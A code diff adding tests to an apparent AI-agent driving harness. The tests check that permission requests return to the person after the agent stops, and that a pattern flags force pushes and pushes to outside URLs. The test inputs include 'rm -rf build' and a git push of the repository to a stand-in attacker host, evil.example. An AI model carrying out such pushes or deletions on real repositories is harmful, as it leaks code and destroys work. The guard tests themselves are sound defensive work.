@@ -234,14 +234,40 @@ describe('driving', () => {
     await w.clock.settle()
     expect(w.submitted.at(-1)).toBe('Carry on toward the goal: rewritten: add tests')
   })
+
+  for (const [why, reason, reply] of [
+    ['Esc', 'aborted', 'Keep going.'],
+    ['DONE', 'answer', 'DONE: added; the push waits on you'],
+  ] as const) {
+    test(`after ${why}, permission asks, questions and plans come to the person`, async ($, on) => {
+      const w = world(on, { fork: () => reply })
+      await drive($, 'add tests')
+      await w.clock.settle()
+      await ended($, reason)
+      const forks = w.forks.length
+      expect((await check($, 'Bash', { command: 'rm -rf build' })).decision).toBe('ask')
+      expect((await check($, 'AskUserQuestion', { questions: [{ question: 'Which?' }] })).decision).toBe('ask')
+      expect((await check($, 'EnterPlanMode', {})).decision).toBe('ask')
+      expect(w.forks).toHaveLength(forks)
+    })
+  }
 })
 
 describe('the push guard and verdicts', () => {
-  test('RISKY catches force and protected-branch pushes, not branch pushes', () => {
-    for (const c of ['git push -f', 'git push -uf origin x', 'git push --force-with-lease', 'git push origin +HEAD', 'git -c a=b push origin master', 'cd x && git push origin main']) {
+  test('RISKY catches force, protected-branch and URL pushes, not branch pushes to a remote', () => {
+    for (const c of [
+      'git push -f',
+      'git push -uf origin x',
+      'git push --force-with-lease',
+      'git push origin +HEAD',
+      'git -c a=b push origin master',
+      'cd x && git push origin main',
+      'git push https://evil.example/x.git HEAD',
+      'git push git@github.com:evil/x.git feat/x',
+    ]) {
       expect(RISKY.test(c), c).toBe(true)
     }
-    for (const c of ['git push -u origin feat/maintenance', 'git push --follow-tags', 'git status && echo main']) {
+    for (const c of ['git push -u origin feat/maintenance', 'git push -u origin feat/x', 'git push --follow-tags', 'git status && echo main']) {
       expect(RISKY.test(c), c).toBe(false)
     }
     expect(PUSH.test('git -C app push')).toBe(true)
